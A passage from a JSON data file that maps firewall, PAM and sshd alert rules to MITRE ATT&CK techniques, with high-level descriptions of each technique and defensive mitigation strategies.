            "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services]( may also indirectly modify firewall rules."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."
        ]
    },
    {
        "rule_id": 4340,
        "rule_description": "PIX: Firewall configuration changed.",
        "mitre_id": [
            "T1562.004"
        ],
        "possible_attacks": [
            "Disable or Modify System Firewall"
        ],
        "description": [
            "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services]( may also indirectly modify firewall rules."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."
        ]
    },
    {
        "rule_id": 4342,
        "rule_description": "PIX: User created or modified on the Firewall.",
        "mitre_id": [
            "T1562.004",
            "T1133"
        ],
        "possible_attacks": [
            "Disable or Modify System Firewall",
            "External Remote Services"
        ],
        "description": [
            "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services]( may also indirectly modify firewall rules.",
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings.",
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 4386,
        "rule_description": "PIX: Multiple AAA (VPN) authentication failures.",
        "mitre_id": [
            "T1110",
            "T1133"
        ],
        "possible_attacks": [
            "Brute Force",
            "External Remote Services"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 4505,
        "rule_description": "Netscreen Erase sequence started.",
        "mitre_id": [
            "T1485"
        ],
        "possible_attacks": [
            "Data Destruction"
        ],
        "description": [
            "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe]( and [Disk Structure Wipe]( because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares](\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers."
        ],
        "mitigation_strategies": [
            "In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., `PutLifecycleConfiguration` in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the `PutBucketLifecycle` API call. "
        ]
    },
    {
        "rule_id": 4509,
        "rule_description": "Netscreen firewall: configuration changed.",
        "mitre_id": [
            "T1562.004"
        ],
        "possible_attacks": [
            "Disable or Modify System Firewall"
        ],
        "description": [
            "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services]( may also indirectly modify firewall rules."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."
        ]
    },
    {
        "rule_id": 4550,
        "rule_description": "Netscreen firewall: Multiple critical messages from",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 4551,
        "rule_description": "Netscreen firewall: Multiple critical messages.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 4851,
        "rule_description": "SonicWall: Multiple firewall error messages.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 5503,
        "rule_description": "PAM: User login failed.",
        "mitre_id": [
            "T1110.001"
        ],
        "possible_attacks": [
            "Password Guessing"
        ],
        "description": [
            "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625."
        ],
        "mitigation_strategies": [
            "Upgrade management services to the latest supported and compatible version.  Specifically, any version providing increased password complexity or policy enforcement preventing default or weak passwords. "
        ]
    },
    {
        "rule_id": 5551,
        "rule_description": "PAM: Multiple failed logins in a small period of time.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5557,
        "rule_description": "unix_chkpwd: Password check failed.",
        "mitre_id": [
            "T1110.001"
        ],
        "possible_attacks": [
            "Password Guessing"
        ],
        "description": [
            "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625."
        ],
        "mitigation_strategies": [
            "Upgrade management services to the latest supported and compatible version.  Specifically, any version providing increased password complexity or policy enforcement preventing default or weak passwords. "
        ]
    },
    {
        "rule_id": 5601,
        "rule_description": "telnetd: Connection refused by TCP Wrappers.",
        "mitre_id": [
            "T1095"
        ],
        "possible_attacks": [
            "Non-Application Layer Protocol"
        ],
        "description": [
            "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
        ],
        "mitigation_strategies": [
            "Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces."
        ]
    },
    {
        "rule_id": 5631,
        "rule_description": "telnetd: Multiple connection attempts from same source",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5701,
        "rule_description": "sshd: Possible attack on the ssh server (or version gathering).",
        "mitre_id": [
            "T1190"
        ],
        "possible_attacks": [
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 5703,
        "rule_description": "sshd: Possible breakin attempt (high number of reverse lookup errors).",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5705,
        "rule_description": "sshd: Possible scan or breakin attempt (high number of login timeouts).",
        "mitre_id": [
            "T1190",
            "T1110"
        ],
        "possible_attacks": [
            "Exploit Public-Facing Application",
            "Brute Force"
        ],
        "description": [
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure.",
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5706,
        "rule_description": "sshd: insecure connection attempt (scan).",
        "mitre_id": [
            "T1021.004"
        ],
        "possible_attacks": [
            "SSH"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user."
        ],
        "mitigation_strategies": [
            "Limit which user accounts are allowed to login via SSH."
        ]
    },
    {
        "rule_id": 5707,
        "rule_description": "sshd: OpenSSH challenge-response exploit.",
        "mitre_id": [
            "T1210",
            "T1068"
        ],
        "possible_attacks": [
            "Exploitation of Remote Services",
            "Exploitation for Privilege Escalation"
        ],
        "description": [
            "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery]( or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation]( as a result of lateral movement exploitation as well.",
            "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer]( or [Lateral Tool Transfer]("
        ],
        "mitigation_strategies": [
            "Regularly scan the internal network for available services to identify new and potentially vulnerable services.",
            "Update software regularly by employing patch management for internal enterprise endpoints and servers."
        ]
    },
    {
        "rule_id": 5710,
        "rule_description": "sshd: Attempt to login using a non-existent user",
        "mitre_id": [
            "T1110.001",
            "T1021.004"
        ],
        "possible_attacks": [
            "Password Guessing",
            "SSH"
        ],
        "description": [
            "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
            "Adversaries may use [Valid Accounts]( to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user."
        ],
        "mitigation_strategies": [
            "Upgrade management services to the latest supported and compatible version.  Specifically, any version providing increased password complexity or policy enforcement preventing default or weak passwords. ",
